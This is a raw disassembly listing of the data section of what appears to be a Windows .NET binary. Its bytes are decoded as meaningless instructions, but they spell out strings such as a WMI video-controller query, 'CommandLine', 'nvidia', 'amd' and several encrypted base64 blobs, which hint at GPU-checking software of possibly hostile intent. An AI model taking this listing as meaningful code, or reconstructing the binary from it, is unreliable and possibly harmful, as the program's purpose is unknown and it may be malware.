   14000306a:	6f                   	outsl  (%rsi),(%dx)
   14000306b:	00 72 00             	add    %dh,0x0(%rdx)
   14000306e:	20 00                	and    %al,(%rax)
   140003070:	46 00 52 00          	rex.RX add %r10b,0x0(%rdx)
   140003074:	4f 00 4d 00          	rex.WRXB add %r9b,0x0(%r13)
   140003078:	20 00                	and    %al,(%rax)
   14000307a:	57                   	push   %rdi
   14000307b:	00 69 00             	add    %ch,0x0(%rcx)
   14000307e:	6e                   	outsb  (%rsi),(%dx)
   14000307f:	00 33                	add    %dh,(%rbx)
   140003081:	00 32                	add    %dh,(%rdx)
   140003083:	00 5f 00             	add    %bl,0x0(%rdi)
   140003086:	56                   	push   %rsi
   140003087:	00 69 00             	add    %ch,0x0(%rcx)
   14000308a:	64 00 65 00          	add    %ah,%fs:0x0(%rbp)
   14000308e:	6f                   	outsl  (%rsi),(%dx)
   14000308f:	00 43 00             	add    %al,0x0(%rbx)
   140003092:	6f                   	outsl  (%rsi),(%dx)
   140003093:	00 6e 00             	add    %ch,0x0(%rsi)
   140003096:	74 00                	je     0x140003098
   140003098:	72 00                	jb     0x14000309a
   14000309a:	6f                   	outsl  (%rsi),(%dx)
   14000309b:	00 6c 00 6c          	add    %ch,0x6c(%rax,%rax,1)
   14000309f:	00 65 00             	add    %ah,0x0(%rbp)
   1400030a2:	72 00                	jb     0x1400030a4
   1400030a4:	00 03                	add    %al,(%rbx)
   1400030a6:	20 00                	and    %al,(%rax)
   1400030a8:	00 1d 56 00 69 00    	add    %bl,0x690056(%rip)        # 0x140693104
   1400030ae:	64 00 65 00          	add    %ah,%fs:0x0(%rbp)
   1400030b2:	6f                   	outsl  (%rsi),(%dx)
   1400030b3:	00 50 00             	add    %dl,0x0(%rax)
   1400030b6:	72 00                	jb     0x1400030b8
   1400030b8:	6f                   	outsl  (%rsi),(%dx)
   1400030b9:	00 63 00             	add    %ah,0x0(%rbx)
   1400030bc:	65 00 73 00          	add    %dh,%gs:0x0(%rbx)
   1400030c0:	73 00                	jae    0x1400030c2
   1400030c2:	6f                   	outsl  (%rsi),(%dx)
   1400030c3:	00 72 00             	add    %dh,0x0(%rdx)
   1400030c6:	00 09                	add    %cl,(%rcx)
   1400030c8:	4e 00 61 00          	rex.WRX add %r12b,0x0(%rcx)
   1400030cc:	6d                   	insl   (%dx),(%rdi)
   1400030cd:	00 65 00             	add    %ah,0x0(%rbp)
   1400030d0:	00 80 b1 5a 00 44    	add    %al,0x44005ab1(%rax)
   1400030d6:	00 71 00             	add    %dh,0x0(%rcx)
   1400030d9:	51                   	push   %rcx
   1400030da:	00 6f 00             	add    %ch,0x0(%rdi)
   1400030dd:	42 00 50 00          	rex.X add %dl,0x0(%rax)
   1400030e1:	4b 00 35 00 34 00 48 	rex.WXB add %sil,0x48003400(%rip)        # 0x1880064e8
   1400030e8:	00 47 00             	add    %al,0x0(%rdi)
   1400030eb:	59                   	pop    %rcx
   1400030ec:	00 75 00             	add    %dh,0x0(%rbp)
   1400030ef:	2b 00                	sub    (%rax),%eax
   1400030f1:	35 00 67 00 6f       	xor    $0x6f006700,%eax
   1400030f6:	00 52 00             	add    %dl,0x0(%rdx)
   1400030f9:	6b 00 32             	imul   $0x32,(%rax),%eax
   1400030fc:	00 5a 00             	add    %bl,0x0(%rdx)
   1400030ff:	51                   	push   %rcx
   140003100:	00 42 00             	add    %al,0x0(%rdx)
   140003103:	6e                   	outsb  (%rsi),(%dx)
   140003104:	00 6e 00             	add    %ch,0x0(%rsi)
   140003107:	68 00 6d 00 4f       	push   $0x4f006d00
   14000310c:	00 36                	add    %dh,(%rsi)
   14000310e:	00 36                	add    %dh,(%rsi)
   140003110:	00 7a 00             	add    %bh,0x0(%rdx)
   140003113:	39 00                	cmp    %eax,(%rax)
   140003115:	4e 00 73 00          	rex.WRX add %r14b,0x0(%rbx)
   140003119:	64 00 33             	add    %dh,%fs:(%rbx)
   14000311c:	00 64 00 52          	add    %ah,0x52(%rax,%rax,1)
   140003120:	00 46 00             	add    %al,0x0(%rsi)
   140003123:	59                   	pop    %rcx
   140003124:	00 54 00 4b          	add    %dl,0x4b(%rax,%rax,1)
   140003128:	00 70 00             	add    %dh,0x0(%rax)
   14000312b:	32 00                	xor    (%rax),%al
   14000312d:	63 00                	movsxd (%rax),%eax
   14000312f:	6f                   	outsl  (%rsi),(%dx)
   140003130:	00 38                	add    %bh,(%rax)
   140003132:	00 41 00             	add    %al,0x0(%rcx)
   140003135:	44 00 6c 00 65       	add    %r13b,0x65(%rax,%rax,1)
   14000313a:	00 4f 00             	add    %cl,0x0(%rdi)
   14000313d:	42 00 64 00 76       	add    %spl,0x76(%rax,%r8,1)
   140003142:	00 41 00             	add    %al,0x0(%rcx)
   140003145:	73 00                	jae    0x140003147
   140003147:	55                   	push   %rbp
   140003148:	00 6b 00             	add    %ch,0x0(%rbx)
   14000314b:	31 00                	xor    %eax,(%rax)
   14000314d:	49 00 42 00          	rex.WB add %al,0x0(%r10)
   140003151:	7a 00                	jp     0x140003153
   140003153:	36 00 72 00          	ss add %dh,0x0(%rdx)
   140003157:	57                   	push   %rdi
   140003158:	00 31                	add    %dh,(%rcx)
   14000315a:	00 7a 00             	add    %bh,0x0(%rdx)
   14000315d:	54                   	push   %rsp
   14000315e:	00 31                	add    %dh,(%rcx)
   140003160:	00 78 00             	add    %bh,0x0(%rax)
   140003163:	4b 00 52 00          	rex.WXB add %dl,0x0(%r10)
   140003167:	56                   	push   %rsi
   140003168:	00 66 00             	add    %ah,0x0(%rsi)
   14000316b:	57                   	push   %rdi
   14000316c:	00 52 00             	add    %dl,0x0(%rdx)
   14000316f:	71 00                	jno    0x140003171
   140003171:	4b 00 71 00          	rex.WXB add %sil,0x0(%r9)
   140003175:	72 00                	jb     0x140003177
   140003177:	49 00 39             	rex.WB add %dil,(%r9)
   14000317a:	00 4a 00             	add    %cl,0x0(%rdx)
   14000317d:	67 00 3d 00 3d 00 00 	add    %bh,0x3d00(%eip)        # 0x140006e84
   140003184:	31 4b 00             	xor    %ecx,0x0(%rbx)
   140003187:	71 00                	jno    0x140003189
   140003189:	59                   	pop    %rcx
   14000318a:	00 72 00             	add    %dh,0x0(%rdx)
   14000318d:	78 00                	js     0x14000318f
   14000318f:	68 00 35 00 7a       	push   $0x7a003500
   140003194:	00 78 00             	add    %bh,0x0(%rax)
   140003197:	6f                   	outsl  (%rsi),(%dx)
   140003198:	00 56 00             	add    %dl,0x0(%rsi)
   14000319b:	64 00 6f 00          	add    %ch,%fs:0x0(%rdi)
   14000319f:	31 00                	xor    %eax,(%rax)
   1400031a1:	34 00                	xor    $0x0,%al
   1400031a3:	65 00 69 00          	add    %ch,%gs:0x0(%rcx)
   1400031a7:	7a 00                	jp     0x1400031a9
   1400031a9:	41 00 70 00          	add    %sil,0x0(%r8)
   1400031ad:	30 00                	xor    %al,(%rax)
   1400031af:	77 00                	ja     0x1400031b1
   1400031b1:	3d 00 3d 00 00       	cmp    $0x3d00,%eax
   1400031b6:	17                   	(bad)
   1400031b7:	43 00 6f 00          	rex.XB add %bpl,0x0(%r15)
   1400031bb:	6d                   	insl   (%dx),(%rdi)
   1400031bc:	00 6d 00             	add    %ch,0x0(%rbp)
   1400031bf:	61                   	(bad)
   1400031c0:	00 6e 00             	add    %ch,0x0(%rsi)
   1400031c3:	64 00 4c 00 69       	add    %cl,%fs:0x69(%rax,%rax,1)
   1400031c8:	00 6e 00             	add    %ch,0x0(%rsi)
   1400031cb:	65 00 00             	add    %al,%gs:(%rax)
   1400031ce:	31 4e 00             	xor    %ecx,0x0(%rsi)
   1400031d1:	46 00 70 00          	rex.RX add %r14b,0x0(%rax)
   1400031d5:	56                   	push   %rsi
   1400031d6:	00 48 00             	add    %cl,0x0(%rax)
   1400031d9:	49 00 73 00          	rex.WB add %sil,0x0(%r11)
   1400031dd:	67 00 56 00          	add    %dl,0x0(%esi)
   1400031e1:	4e 00 38             	rex.WRX add %r15b,(%rax)
   1400031e4:	00 63 00             	add    %ah,0x0(%rbx)
   1400031e7:	62                   	(bad)
   1400031e8:	00 6d 00             	add    %ch,0x0(%rbp)
   1400031eb:	65 00 58 00          	add    %bl,%gs:0x0(%rax)
   1400031ef:	30 00                	xor    %al,(%rax)
   1400031f1:	35 00 58 00 70       	xor    $0x70005800,%eax
   1400031f6:	00 4c 00 51          	add    %cl,0x51(%rax,%rax,1)
   1400031fa:	00 3d 00 3d 00 00    	add    %bh,0x3d00(%rip)        # 0x140006f00
   140003200:	0d 6e 00 76 00       	or     $0x76006e,%eax
   140003205:	69 00 64 00 69 00    	imul   $0x690064,(%rax),%eax
   14000320b:	61                   	(bad)
   14000320c:	00 00                	add    %al,(%rax)
   14000320e:	07                   	(bad)
   14000320f:	61                   	(bad)
   140003210:	00 6d 00             	add    %ch,0x0(%rbp)
   140003213:	64 00 00             	add    %al,%fs:(%rax)
   140003216:	21 73 00             	and    %esi,0x0(%rbx)
   140003219:	6d                   	insl   (%dx),(%rdi)
   14000321a:	00 71 00             	add    %dh,0x0(%rcx)
   14000321d:	6b 00 62             	imul   $0x62,(%rax),%eax
   140003220:	00 72 00             	add    %dh,0x0(%rdx)
   140003223:	6c                   	insb   (%dx),(%rdi)
   140003224:	00 7a 00             	add    %bh,0x0(%rdx)
   140003227:	65 00 67 00          	add    %ah,%gs:0x0(%rdi)
   14000322b:	78 00                	js     0x14000322d
   14000322d:	65 00 77 00          	add    %dh,%gs:0x0(%rdi)
   140003231:	68 00 70 00 77       	push   $0x77007000
   140003236:	00 00                	add    %al,(%rax)
   140003238:	82                   	(bad)
   140003239:	01 67 00             	add    %esp,0x0(%rdi)
   14000323c:	67 00 67 00          	add    %ah,0x0(%edi)
   140003240:	74 00                	je     0x140003242
   140003242:	6e                   	outsb  (%rsi),(%dx)
   140003243:	00 64 00 66          	add    %ah,0x66(%rax,%rax,1)
   140003247:	00 63 00             	add    %ah,0x0(%rbx)
   14000324a:	79 00                	jns    0x14000324c
   14000324c:	6d                   	insl   (%dx),(%rdi)
   14000324d:	00 63 00             	add    %ah,0x0(%rbx)
   140003250:	79 00                	jns    0x140003252
   140003252:	6b 00 75             	imul   $0x75,(%rax),%eax
   140003255:	00 63 00             	add    %ah,0x0(%rbx)
   140003258:	7a 00                	jp     0x14000325a
   14000325a:	6a 00                	push   $0x0
   14000325c:	65 00 75 00          	add    %dh,%gs:0x0(%rbp)
   140003260:	6d                   	insl   (%dx),(%rdi)
   140003261:	00 6f 00             	add    %ch,0x0(%rdi)
   140003264:	68 00 75 00 61       	push   $0x61007500
   140003269:	00 6d 00             	add    %ch,0x0(%rbp)
   14000326c:	66 00 78 00          	data16 add %bh,0x0(%rax)
   140003270:	6f                   	outsl  (%rsi),(%dx)
   140003271:	00 7a 00             	add    %bh,0x0(%rdx)
   140003274:	70 00                	jo     0x140003276
   140003276:	64 00 7a 00          	add    %bh,%fs:0x0(%rdx)
   14000327a:	79 00                	jns    0x14000327c
   14000327c:	79 00                	jns    0x14000327e
   14000327e:	79 00                	jns    0x140003280
   140003280:	73 00                	jae    0x140003282
   140003282:	76 00                	jbe    0x140003284
   140003284:	62                   	(bad)
   140003285:	00 75 00             	add    %dh,0x0(%rbp)
   140003288:	68 00 62 00 6c       	push   $0x6c006200
   14000328d:	00 61 00             	add    %ah,0x0(%rcx)
   140003290:	62                   	(bad)
   140003291:	00 7a 00             	add    %bh,0x0(%rdx)
   140003294:	6c                   	insb   (%dx),(%rdi)
   140003295:	00 70 00             	add    %dh,0x0(%rax)
   140003298:	67 00 78 00          	add    %bh,0x0(%eax)
   14000329c:	67 00 64 00 66       	add    %ah,0x66(%eax,%eax,1)
   1400032a1:	00 66 00             	add    %ah,0x0(%rsi)
   1400032a4:	73 00                	jae    0x1400032a6
   1400032a6:	77 00                	ja     0x1400032a8
   1400032a8:	78 00                	js     0x1400032aa
   1400032aa:	79 00                	jns    0x1400032ac
   1400032ac:	67 00 6d 00          	add    %ch,0x0(%ebp)
   1400032b0:	69 00 66 00 72 00    	imul   $0x720066,(%rax),%eax
   1400032b6:	78 00                	js     0x1400032b8
   1400032b8:	76 00                	jbe    0x1400032ba
   1400032ba:	6f                   	outsl  (%rsi),(%dx)
   1400032bb:	00 63 00             	add    %ah,0x0(%rbx)
   1400032be:	7a 00                	jp     0x1400032c0
   1400032c0:	70 00                	jo     0x1400032c2
   1400032c2:	61                   	(bad)
   1400032c3:	00 76 00             	add    %dh,0x0(%rsi)
   1400032c6:	66 00 65 00          	data16 add %ah,0x0(%rbp)
   1400032ca:	76 00                	jbe    0x1400032cc
   1400032cc:	71 00                	jno    0x1400032ce
   1400032ce:	63 00                	movsxd (%rax),%eax
   1400032d0:	6c                   	insb   (%dx),(%rdi)
   1400032d1:	00 67 00             	add    %ah,0x0(%rdi)
   1400032d4:	6d                   	insl   (%dx),(%rdi)
   1400032d5:	00 73 00             	add    %dh,0x0(%rbx)
   1400032d8:	65 00 65 00          	add    %ah,%gs:0x0(%rbp)
   1400032dc:	6e                   	outsb  (%rsi),(%dx)
   1400032dd:	00 70 00             	add    %dh,0x0(%rax)
   1400032e0:	6e                   	outsb  (%rsi),(%dx)
   1400032e1:	00 69 00             	add    %ch,0x0(%rcx)
   1400032e4:	78 00                	js     0x1400032e6
   1400032e6:	76 00                	jbe    0x1400032e8
   1400032e8:	72 00                	jb     0x1400032ea
   1400032ea:	67 00 75 00          	add    %dh,0x0(%ebp)
   1400032ee:	74 00                	je     0x1400032f0
   1400032f0:	6f                   	outsl  (%rsi),(%dx)
   1400032f1:	00 73 00             	add    %dh,0x0(%rbx)
   1400032f4:	78 00                	js     0x1400032f6
   1400032f6:	64 00 71 00          	add    %dh,%fs:0x0(%rcx)
   1400032fa:	77 00                	ja     0x1400032fc
   1400032fc:	66 00 67 00          	data16 add %ah,0x0(%rdi)
   140003300:	64 00 6c 00 7a       	add    %ch,%fs:0x7a(%rax,%rax,1)
   140003305:	00 66 00             	add    %ah,0x0(%rsi)
   140003308:	64 00 61 00          	add    %ah,%fs:0x0(%rcx)
   14000330c:	69 00 6b 00 6d 00    	imul   $0x6d006b,(%rax),%eax
   140003312:	67 00 73 00          	add    %dh,0x0(%ebx)
   140003316:	6e                   	outsb  (%rsi),(%dx)
   140003317:	00 62 00             	add    %ah,0x0(%rdx)
   14000331a:	66 00 6b 00          	data16 add %ch,0x0(%rbx)
   14000331e:	67 00 71 00          	add    %dh,0x0(%ecx)
   140003322:	6d                   	insl   (%dx),(%rdi)
   140003323:	00 66 00             	add    %ah,0x0(%rsi)
   140003326:	6a 00                	push   $0x0
   140003328:	70 00                	jo     0x14000332a
   14000332a:	61                   	(bad)
   14000332b:	00 74 00 79          	add    %dh,0x79(%rax,%rax,1)
   14000332f:	00 77 00             	add    %dh,0x0(%rdi)
   140003332:	6c                   	insb   (%dx),(%rdi)
   140003333:	00 65 00             	add    %ah,0x0(%rbp)
   140003336:	71 00                	jno    0x140003338
   140003338:	63 00                	movsxd (%rax),%eax
   14000333a:	6b 00 79             	imul   $0x79,(%rax),%eax
   14000333d:	00 78 00             	add    %bh,0x0(%rax)
   140003340:	61                   	(bad)
   140003341:	00 75 00             	add    %dh,0x0(%rbp)
   140003344:	7a 00                	jp     0x140003346
   140003346:	66 00 65 00          	data16 add %ah,0x0(%rbp)
   14000334a:	69 00 75 00 6e 00    	imul   $0x6e0075,(%rax),%eax
   140003350:	7a 00                	jp     0x140003352
   140003352:	6f                   	outsl  (%rsi),(%dx)
   140003353:	00 64 00 6c          	add    %ah,0x6c(%rax,%rax,1)
   140003357:	00 64 00 62          	add    %ah,0x62(%rax,%rax,1)
   14000335b:	00 70 00             	add    %dh,0x0(%rax)
   14000335e:	79 00                	jns    0x140003360
   140003360:	6d                   	insl   (%dx),(%rdi)
   140003361:	00 6e 00             	add    %ch,0x0(%rsi)
   140003364:	70 00                	jo     0x140003366
   140003366:	75 00                	jne    0x140003368
   140003368:	6a 00                	push   $0x0
   14000336a:	63 00                	movsxd (%rax),%eax
   14000336c:	65 00 73 00          	add    %dh,%gs:0x0(%rbx)
   140003370:	62                   	(bad)
   140003371:	00 65 00             	add    %ah,0x0(%rbp)
   140003374:	70 00                	jo     0x140003376
   140003376:	6e                   	outsb  (%rsi),(%dx)
   140003377:	00 79 00             	add    %bh,0x0(%rcx)
   14000337a:	6a 00                	push   $0x0
   14000337c:	71 00                	jno    0x14000337e
   14000337e:	65 00 75 00          	add    %dh,%gs:0x0(%rbp)
   140003382:	64 00 6d 00          	add    %ch,%fs:0x0(%rbp)
   140003386:	68 00 67 00 67       	push   $0x67006700
   14000338b:	00 6d 00             	add    %ch,0x0(%rbp)
   14000338e:	6d                   	insl   (%dx),(%rdi)
   14000338f:	00 66 00             	add    %ah,0x0(%rsi)
   140003392:	71 00                	jno    0x140003394
   140003394:	6b 00 73             	imul   $0x73,(%rax),%eax
   140003397:	00 78 00             	add    %bh,0x0(%rax)
   14000339a:	67 00 65 00          	add    %ah,0x0(%ebp)
   14000339e:	75 00                	jne    0x1400033a0
   1400033a0:	69 00 63 00 69 00    	imul   $0x690063,(%rax),%eax
   1400033a6:	66 00 75 00          	data16 add %dh,0x0(%rbp)
   1400033aa:	78 00                	js     0x1400033ac
   1400033ac:	6f                   	outsl  (%rsi),(%dx)
   1400033ad:	00 66 00             	add    %ah,0x0(%rsi)
   1400033b0:	66 00 63 00          	data16 add %ah,0x0(%rbx)
   1400033b4:	6c                   	insb   (%dx),(%rdi)
   1400033b5:	00 7a 00             	add    %bh,0x0(%rdx)
   1400033b8:	63 00                	movsxd (%rax),%eax
   1400033ba:	62                   	(bad)
   1400033bb:	00 68 00             	add    %ch,0x0(%rax)
   1400033be:	6d                   	insl   (%dx),(%rdi)
   1400033bf:	00 6b 00             	add    %ch,0x0(%rbx)
   1400033c2:	69 00 70 00 61 00    	imul   $0x610070,(%rax),%eax
   1400033c8:	73 00                	jae    0x1400033ca
   1400033ca:	72 00                	jb     0x1400033cc
   1400033cc:	77 00                	ja     0x1400033ce
   1400033ce:	75 00                	jne    0x1400033d0
   1400033d0:	61                   	(bad)
   1400033d1:	00 7a 00             	add    %bh,0x0(%rdx)
   1400033d4:	72 00                	jb     0x1400033d6
   1400033d6:	63 00                	movsxd (%rax),%eax
   1400033d8:	75 00                	jne    0x1400033da
   1400033da:	71 00                	jno    0x1400033dc
   1400033dc:	66 00 69 00          	data16 add %ch,0x0(%rcx)
   1400033e0:	61                   	(bad)
   1400033e1:	00 66 00             	add    %ah,0x0(%rsi)
   1400033e4:	66 00 6f 00          	data16 add %ch,0x0(%rdi)
   1400033e8:	69 00 6a 00 76 00    	imul   $0x76006a,(%rax),%eax
   1400033ee:	6f                   	outsl  (%rsi),(%dx)
   1400033ef:	00 65 00             	add    %ah,0x0(%rbp)
   1400033f2:	75 00                	jne    0x1400033f4
   1400033f4:	73 00                	jae    0x1400033f6
   1400033f6:	6a 00                	push   $0x0
   1400033f8:	76 00                	jbe    0x1400033fa
   1400033fa:	6d                   	insl   (%dx),(%rdi)
   1400033fb:	00 62 00             	add    %ah,0x0(%rdx)
   1400033fe:	6c                   	insb   (%dx),(%rdi)
   1400033ff:	00 66 00             	add    %ah,0x0(%rsi)
   140003402:	74 00                	je     0x140003404
   140003404:	6d                   	insl   (%dx),(%rdi)
   140003405:	00 6b 00             	add    %ch,0x0(%rbx)
   140003408:	65 00 65 00          	add    %ah,%gs:0x0(%rbp)
   14000340c:	74 00                	je     0x14000340e
   14000340e:	67 00 74 00 61       	add    %dh,0x61(%eax,%eax,1)
   140003413:	00 64 00 69          	add    %ah,0x69(%rax,%rax,1)
   140003417:	00 72 00             	add    %dh,0x0(%rdx)
   14000341a:	6d                   	insl   (%dx),(%rdi)
   14000341b:	00 74 00 6e          	add    %dh,0x6e(%rax,%rax,1)
   14000341f:	00 6e 00             	add    %ch,0x0(%rsi)
   140003422:	6f                   	outsl  (%rsi),(%dx)
   140003423:	00 7a 00             	add    %bh,0x0(%rdx)
   140003426:	6e                   	outsb  (%rsi),(%dx)
   140003427:	00 70 00             	add    %dh,0x0(%rax)
   14000342a:	79 00                	jns    0x14000342c
   14000342c:	64 00 73 00          	add    %dh,%fs:0x0(%rbx)
   140003430:	6e                   	outsb  (%rsi),(%dx)
   140003431:	00 73 00             	add    %dh,0x0(%rbx)
   140003434:	75 00                	jne    0x140003436
   140003436:	72 00                	jb     0x140003438
   140003438:	77 00                	ja     0x14000343a
   14000343a:	00 41 67             	add    %al,0x67(%rcx)
   14000343d:	00 6d 00             	add    %ch,0x0(%rbp)
   140003440:	6b 00 66             	imul   $0x66,(%rax),%eax
   140003443:	00 66 00             	add    %ah,0x0(%rsi)
   140003446:	6e                   	outsb  (%rsi),(%dx)
   140003447:	00 64 00 69          	add    %ah,0x69(%rax,%rax,1)
   14000344b:	00 62 00             	add    %ah,0x0(%rdx)
   14000344e:	68 00 79 00 75       	push   $0x75007900
   140003453:	00 7a 00             	add    %bh,0x0(%rdx)
   140003456:	67 00 75 00          	add    %dh,0x0(%ebp)
   14000345a:	66 00 6a 00          	data16 add %ch,0x0(%rdx)
   14000345e:	67 00 6f 00          	add    %ch,0x0(%edi)
   140003462:	73 00                	jae    0x140003464
   140003464:	6b 00 65             	imul   $0x65,(%rax),%eax
   140003467:	00 67 00             	add    %ah,0x0(%rdi)
   14000346a:	6e                   	outsb  (%rsi),(%dx)
   14000346b:	00 61 00             	add    %ah,0x0(%rcx)
   14000346e:	69 00 79 00 65 00    	imul   $0x650079,(%rax),%eax
   140003474:	70 00                	jo     0x140003476
   140003476:	74 00                	je     0x140003478
   140003478:	71 00                	jno    0x14000347a
   14000347a:	76 00                	jbe    0x14000347c
   14000347c:	00 31                	add    %dh,(%rcx)
   14000347e:	48 00 31             	rex.W add %sil,(%rcx)
   140003481:	00 67 00             	add    %ah,0x0(%rdi)
   140003484:	30 00                	xor    %al,(%rax)
   140003486:	77 00                	ja     0x140003488
   140003488:	4a 00 55 00          	rex.WX add %dl,0x0(%rbp)
   14000348c:	59                   	pop    %rcx
   14000348d:	00 73 00             	add    %dh,0x0(%rbx)
   140003490:	39 00                	cmp    %eax,(%rax)
   140003492:	4b 00 79 00          	rex.WXB add %dil,0x0(%r9)
   140003496:	44 00 31             	add    %r14b,(%rcx)
   140003499:	00 65 00             	add    %ah,0x0(%rbp)
   14000349c:	4e 00 34 00          	rex.WRX add %r14b,(%rax,%r8,1)
   1400034a0:	62                   	(bad)
   1400034a1:	00 52 00             	add    %dl,0x0(%rdx)
   1400034a4:	41 00 55 00          	add    %dl,0x0(%r13)
   1400034a8:	67 00 3d 00 3d 00 00 	add    %bh,0x3d00(%eip)        # 0x1400071af
   1400034af:	00 fd                	add    %bh,%ch
   1400034b1:	ce                   	(bad)
   1400034b2:	0b e2                	or     %edx,%esp
   1400034b4:	76 01                	jbe    0x1400034b7
   1400034b6:	17                   	(bad)
   1400034b7:	4a a8 80             	rex.WX test $0x80,%al
   1400034ba:	69 a6 c7 0a ba 7c 00 	imul   $0x7ab70800,0x7cba0ac7(%rsi),%esp
   1400034c1:	08 b7 7a 
   1400034c4:	5c                   	pop    %rsp
   1400034c5:	56                   	push   %rsi
   1400034c6:	19 34 e0             	sbb    %esi,(%rax,%riz,8)
   1400034c9:	89 03                	mov    %eax,(%rbx)
   1400034cb:	06                   	(bad)
   1400034cc:	1d 05 02 06 08       	sbb    $0x8060205,%eax
   1400034d1:	02 06                	add    (%rsi),%al
   1400034d3:	0e                   	(bad)
   1400034d4:	03 00                	add    (%rax),%eax
   1400034d6:	00 01                	add    %al,(%rcx)
   1400034d8:	04 00                	add    $0x0,%al
   1400034da:	01 0e                	add    %ecx,(%rsi)
   1400034dc:	0e                   	(bad)
   1400034dd:	07                   	(bad)
   1400034de:	00 02                	add    %al,(%rdx)
   1400034e0:	1d 05 1d 05 02       	sbb    $0x2051d05,%eax
   1400034e5:	05 00 02 01 0e       	add    $0xe010200,%eax
   1400034ea:	0e                   	(bad)
   1400034eb:	03 20                	add    (%rax),%esp
   1400034ed:	00 01                	add    %al,(%rcx)
   1400034ef:	01 00                	add    %eax,(%rax)
   1400034f1:	04 20                	add    $0x20,%al
   1400034f3:	01 01                	add    %eax,(%rcx)
   1400034f5:	0e                   	(bad)
   1400034f6:	04 20                	add    $0x20,%al
   1400034f8:	01 01                	add    %eax,(%rcx)
   1400034fa:	08 05 00 01 1d 05    	or     %al,0x51d0100(%rip)        # 0x1451d3600
   140003500:	0e                   	(bad)
   140003501:	04 00                	add    $0x0,%al
   140003503:	01 01                	add    %eax,(%rcx)
   140003505:	08 08                	or     %cl,(%rax)
   140003507:	b0 3f                	mov    $0x3f,%al
   140003509:	5f                   	pop    %rdi
   14000350a:	7f 11                	jg     0x14000351d
   14000350c:	d5 0a 3a 05 20 01 01 	{rex2 0xa} cmp 0x11010120(%rip),%al        # 0x151013634
   140003513:	11 
   140003514:	35 06 20 02 01       	xor    $0x1022006,%eax
   140003519:	0e                   	(bad)
   14000351a:	12 31                	adc    (%rcx),%dh
   14000351c:	07                   	(bad)
   14000351d:	20 02                	and    %al,(%rdx)
   14000351f:	01 12                	add    %edx,(%rdx)
   140003521:	39 12                	cmp    %edx,(%rdx)
   140003523:	3d 04 20 00 12       	cmp    $0x12002004,%eax
   140003528:	45 04 20             	rex.RB add $0x20,%al
   14000352b:	00 12                	add    %dl,(%rdx)
   14000352d:	49 04 20             	rex.WB add $0x20,%al
   140003530:	00 12                	add    %dl,(%rdx)
   140003532:	4d 04 20             	rex.WRB add $0x20,%al
   140003535:	01 1c 0e             	add    %ebx,(%rsi,%rcx,1)
   140003538:	05 00 01 0e 1d       	add    $0x1d0e0100,%eax
   14000353d:	1c 03                	sbb    $0x3,%al
   14000353f:	20 00                	and    %al,(%rax)
   140003541:	02 05 00 02 0e 0e    	add    0xe0e0200(%rip),%al        # 0x14e0e3747
   140003547:	1c 03                	sbb    $0x3,%al
   140003549:	20 00                	and    %al,(%rax)
   14000354b:	0e                   	(bad)
   14000354c:	04 20                	add    $0x20,%al
   14000354e:	01 02                	add    %eax,(%rdx)
   140003550:	0e                   	(bad)
   140003551:	04 00                	add    $0x0,%al
   140003553:	01 02                	add    %eax,(%rdx)
   140003555:	0e                   	(bad)
   140003556:	06                   	(bad)
   140003557:	20 02                	and    %al,(%rdx)
   140003559:	08 0e                	or     %cl,(%rsi)
   14000355b:	11 5d 06             	adc    %ebx,0x6(%rbp)
   14000355e:	00 02                	add    %al,(%rdx)
   140003560:	01 0e                	add    %ecx,(%rsi)
   140003562:	1d 05 05 20 01       	sbb    $0x1200505,%eax
   140003567:	01 11                	add    %edx,(%rcx)
   140003569:	65 04 20             	gs add $0x20,%al
   14000356c:	01 01                	add    %eax,(%rcx)
   14000356e:	02 06                	add    (%rsi),%al
   140003570:	00 01                	add    %al,(%rcx)
   140003572:	12 6d 12             	adc    0x12(%rbp),%ch
   140003575:	61                   	(bad)
   140003576:	19 07                	sbb    %eax,(%rdi)
   140003578:	0d 0e 02 12 31       	or     $0x3112020e,%eax
   14000357d:	12 39                	adc    (%rcx),%bh
   14000357f:	12 45 12             	adc    0x12(%rbp),%al
   140003582:	51                   	push   %rcx
   140003583:	12 45 12             	adc    0x12(%rbp),%al
   140003586:	51                   	push   %rcx
   140003587:	12 61 12             	adc    0x12(%rcx),%ah
   14000358a:	49 1c 1d             	rex.WB sbb $0x1d,%al
   14000358d:	1c 12                	sbb    $0x12,%al
   14000358f:	49 04 00             	rex.WB add $0x0,%al
   140003592:	00 12                	add    %dl,(%rdx)
   140003594:	75 05                	jne    0x14000359b
   140003596:	20 01                	and    %al,(%rcx)
   140003598:	0e                   	(bad)
   140003599:	1d 05 05 20 01       	sbb    $0x1200505,%eax
   14000359e:	1d 05 0e 07 20       	sbb    $0x20070e05,%eax
   1400035a3:	03 01                	add    (%rcx),%eax
   1400035a5:	0e                   	(bad)
   1400035a6:	1d 05 08 06 20       	sbb    $0x20060805,%eax
   1400035ab:	01 01                	add    %eax,(%rcx)
   1400035ad:	11 80 89 05 20 01    	adc    %eax,0x1200589(%rax)
   1400035b3:	1d 05 08 09 20       	sbb    $0x20090805,%eax
   1400035b8:	02 12                	add    (%rdx),%dl
   1400035ba:	80 91 1d 05 1d 05 0c 	adcb   $0xc,0x51d051d(%rcx)
   1400035c1:	20 03                	and    %al,(%rbx)
   1400035c3:	01 12                	add    %edx,(%rdx)
   1400035c5:	80 9d 12 80 91 11 80 	sbbb   $0x80,0x11918012(%rbp)
   1400035cc:	a1 07 20 03 01 1d 05 	movabs 0x808051d01032007,%eax
   1400035d3:	08 08 
   1400035d5:	04 20                	add    $0x20,%al
   1400035d7:	00 1d 05 17 07 08    	add    %bl,0x8071705(%rip)        # 0x148074ce2
   1400035dd:	1d 05 12 7d 12       	sbb    $0x127d1205,%eax
   1400035e2:	80 81 12 80 91 12 80 	addb   $0x80,0x12918012(%rcx)
   1400035e9:	95                   	xchg   %eax,%ebp
   1400035ea:	12 80 99 12 80 81    	adc    -0x7e7fed67(%rax),%al
   1400035f0:	1d 05 03 00 00       	sbb    $0x305,%eax
   1400035f5:	0e                   	(bad)
   1400035f6:	04 07                	add    $0x7,%al
   1400035f8:	01 12                	add    %edx,(%rdx)
   1400035fa:	61                   	(bad)
   1400035fb:	05 00 00 12 80       	add    $0x80120000,%eax
   140003600:	a9 06 20 01 01       	test   $0x1012006,%eax
   140003605:	12 80 a9 06 20 01    	adc    0x12006a9(%rax),%al
   14000360b:	02 11                	add    (%rcx),%dl
   14000360d:	80 b1 06 00 01 0e 11 	xorb   $0x11,0xe010006(%rcx)
   140003614:	80 b5 05 00 02 0e 0e 	xorb   $0xe,0xe020005(%rbp)
   14000361b:	0e                   	(bad)
   14000361c:	1e                   	(bad)
